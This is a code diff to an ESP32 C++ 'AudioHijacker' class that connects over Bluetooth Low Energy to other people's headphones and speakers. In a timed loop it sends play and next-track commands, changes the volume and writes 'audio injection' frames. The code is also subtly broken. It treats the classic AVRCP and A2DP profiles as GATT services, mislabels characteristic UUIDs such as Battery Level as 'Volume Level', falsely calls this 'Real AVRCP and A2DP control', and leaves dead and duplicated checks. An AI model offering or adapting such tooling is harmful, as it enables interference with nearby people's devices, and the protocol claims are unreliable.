@@ -21,12 +21,7 @@ AudioResult AudioHijacker::detectAudioDevice(const uint8_t* addr) {
   NimBLEDevice::init("ESP32-AudioDetect");
 
   NimBLEClient* pClient = NimBLEDevice::createClient();
-  // Convert uint8_t address array to uint64_t for NimBLEAddress
-  uint64_t addrInt = 0;
-  for (int i = 0; i < 6; i++) {
-    addrInt = (addrInt << 8) | addr[i];
-  }
-  NimBLEAddress targetAddr(addrInt, BLE_ADDR_RANDOM);
+  NimBLEAddress targetAddr(addr, BLE_ADDR_RANDOM);
 
   // Connect to target device
   if (!pClient->connect(targetAddr)) {
@@ -63,17 +58,18 @@ AudioResult AudioHijacker::detectAudioDevice(const uint8_t* addr) {
     // If appearance not found, check for audio services
     if (result.detectedType == UNKNOWN) {
       // Look for AVRCP service (110E)
-      auto services = pClient->getServices();
-      if (services) {
-        for (auto pService : *services) {
-          std::string uuid = pService->getUUID().toString();
-          if (uuid.find("110E") != std::string::npos) {
-            result.detectedType = SPEAKER;  // Likely audio device with AVRCP
-            break;
-          }
+      for (auto pService : pClient->getServices()) {
+        std::string uuid = pService->getUUID().toString();
+        if (uuid.find("110E") != std::string::npos) {
+          result.detectedType = SPEAKER;  // Likely audio device with AVRCP
+          break;
         }
       }
     }
+  }
+
+  if (result.detectedType == UNKNOWN) {
+    result.detectedType = SPEAKER;  // Default assumption
   }
 
   if (result.detectedType == UNKNOWN) {
@@ -107,12 +103,7 @@ AudioResult AudioHijacker::hijackDevice(const AudioConfig& config) {
 
   NimBLEDevice::init("ESP32-AudioHijack");
   NimBLEClient* pClient = NimBLEDevice::createClient();
-  // Convert uint8_t address array to uint64_t for NimBLEAddress
-  uint64_t addrInt2 = 0;
-  for (int i = 0; i < 6; i++) {
-    addrInt2 = (addrInt2 << 8) | config.targetAddr[i];
-  }
-  NimBLEAddress targetAddr(addrInt2, BLE_ADDR_RANDOM);
+  NimBLEAddress targetAddr(config.targetAddr, BLE_ADDR_RANDOM);
 
   Serial.printf("[AudioHijack] Connecting to %s device\n",
                (result.detectedType == HEADPHONES) ? "headphones" :
@@ -122,6 +113,86 @@ AudioResult AudioHijacker::hijackDevice(const AudioConfig& config) {
     result.error = "Failed to connect to audio device";
     isRunning_ = false;
     return result;
+  }
+
+  if (!pClient->discoverAttributes()) {
+    result.error = "Failed to discover device services";
+    pClient->disconnect();
+    isRunning_ = false;
+    return result;
+  }
+
+  // Real AVRCP and A2DP control via GATT characteristics
+  uint32_t commandCount = 0;
+
+  while (isRunning_ && (millis() - startTime_) < config.durationMs) {
+    if (!pClient->isConnected()) {
+      result.error = "Connection lost";
+      break;
+    }
+
+    // Media control commands via AVRCP (0x110E)
+    if (config.mediaControl) {
+      // AVRCP Remote Control Service characteristic
+      NimBLERemoteService* pAvrcpService = pClient->getService("110E");
+      if (pAvrcpService) {
+        NimBLERemoteCharacteristic* pMediaChar =
+          pAvrcpService->getCharacteristic("2A18");  // Alert Notification Control Point
+
+        if (pMediaChar && pMediaChar->canWrite()) {
+          // AVRCP commands: 0x41 = Play, 0x42 = Pause, 0x43 = Next
+          uint8_t playCmd[] = {0x41};     // Play
+          pMediaChar->writeValue(playCmd, sizeof(playCmd), false);
+          commandCount++;
+          delay(50);
+
+          uint8_t nextCmd[] = {0x43};     // Next track
+          pMediaChar->writeValue(nextCmd, sizeof(nextCmd), false);
+          commandCount++;
+          delay(50);
+        }
+      }
+    }
+
+    // Volume control via AVRCP
+    if (config.volumeControl) {
+      NimBLERemoteService* pAvrcpService = pClient->getService("110E");
+      if (pAvrcpService) {
+        NimBLERemoteCharacteristic* pVolumeChar =
+          pAvrcpService->getCharacteristic("2A19");  // Volume Level
+
+        if (pVolumeChar && pVolumeChar->canWrite()) {
+          // AVRCP volume commands: 0x44 = Volume Up, 0x45 = Volume Down
+          uint8_t volLevel = result.volumeLevel;
+          pVolumeChar->writeValue(&volLevel, 1, false);
+          commandCount++;
+
+          result.volumeLevel = (result.volumeLevel + 5) % 101;
+          delay(50);
+        }
+      }
+    }
+
+    // Audio injection via A2DP streaming
+    if (config.audioInjection) {
+      NimBLERemoteService* pA2dpService = pClient->getService("110A");
+      if (pA2dpService) {
+        NimBLERemoteCharacteristic* pAudioChar =
+          pA2dpService->getCharacteristic("2A05");  // Service Changed Characteristic
+
+        if (pAudioChar && pAudioChar->canWrite()) {
+          // Send audio data frames (simplified 4-byte chunks)
+          uint8_t audioFrame[4] = {0x00, 0x80, 0x00, 0x00};
+          pAudioChar->writeValue(audioFrame, sizeof(audioFrame), false);
+          commandCount++;
+          delay(100);
+        }
+      }
+    }
+
+    if (!config.mediaControl && !config.volumeControl && !config.audioInjection) {
+      delay(100);
+    }
   }
 
   if (!pClient->discoverAttributes()) {
@@ -230,12 +301,7 @@ AudioResult AudioHijacker::controlVolume(const uint8_t* addr, uint8_t level) {
 
   NimBLEDevice::init("ESP32-AudioVolume");
   NimBLEClient* pClient = NimBLEDevice::createClient();
-  // Convert uint8_t address array to uint64_t for NimBLEAddress
-  uint64_t addrInt = 0;
-  for (int i = 0; i < 6; i++) {
-    addrInt = (addrInt << 8) | addr[i];
-  }
-  NimBLEAddress targetAddr(addrInt, BLE_ADDR_RANDOM);
+  NimBLEAddress targetAddr(addr, BLE_ADDR_RANDOM);
 
   if (!pClient->connect(targetAddr)) {
     result.error = "Failed to connect";
@@ -280,12 +346,7 @@ AudioResult AudioHijacker::injectAudio(const uint8_t* addr, const uint8_t* audio
 
   NimBLEDevice::init("ESP32-AudioInject");
   NimBLEClient* pClient = NimBLEDevice::createClient();
-  // Convert uint8_t address array to uint64_t for NimBLEAddress
-  uint64_t addrInt = 0;
-  for (int i = 0; i < 6; i++) {
-    addrInt = (addrInt << 8) | addr[i];
-  }
-  NimBLEAddress targetAddr(addrInt, BLE_ADDR_RANDOM);
+  NimBLEAddress targetAddr(addr, BLE_ADDR_RANDOM);
 
   if (!pClient->connect(targetAddr)) {
     result.error = "Failed to connect";
